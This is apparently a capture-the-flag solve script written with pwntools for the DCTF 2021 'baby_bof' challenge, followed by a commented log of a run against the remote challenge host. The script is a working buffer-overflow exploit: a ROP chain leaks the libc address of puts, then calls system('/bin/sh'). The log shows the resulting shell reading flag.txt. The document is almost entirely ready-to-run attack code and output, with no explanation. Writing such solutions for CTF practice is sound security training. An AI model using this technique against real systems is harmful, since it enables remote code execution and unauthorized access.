from pwn import *

#context.log_level = 'debug'

BINARY = './baby_bof'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf-chall-baby-bof.westeurope.azurecontainer.io"
  PORT = 7481
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

pop_rdi_ret = 0x400683 # pop rdi; ret

s.recvuntil("plz don't rop me")

buf  = b"A"*18
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(elf.plt.puts)
buf += p64(elf.sym.main)
s.sendline(buf)

s.recvuntil("i don't think this will work\n")
r = s.recvuntil("\n")[:-1]
puts_addr   = u64(r + b"\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

print("puts_addr   =", hex(puts_addr))
print("libc_base   =", hex(libc_base))
print("system_addr =", hex(system_addr))
print("binsh_addr  =", hex(binsh_addr))

s.recvuntil("plz don't rop me")

buf  = b"A"*18
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()
'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Baby_bof_250$ python3 solve.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Baby_bof_250/baby_bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf-chall-baby-bof.westeurope.azurecontainer.io on port 7481: Done
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr   = 0x7f477b23d5a0
libc_base   = 0x7f477b1b6000
system_addr = 0x7f477b20b410
binsh_addr  = 0x7f477b36d5aa
[*] Switching to interactive mode

i don't think this will work
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ ls -l
total 20
-rwxr-xr-x 1 pilot pilot 8408 May 14 00:49 baby_bof
-rw-r--r-- 1 root  root    39 May 14 00:49 flag.txt
-rw-r--r-- 1 root  root   201 May 14 00:49 startService.sh
$ cat flag.txt
dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}
'''
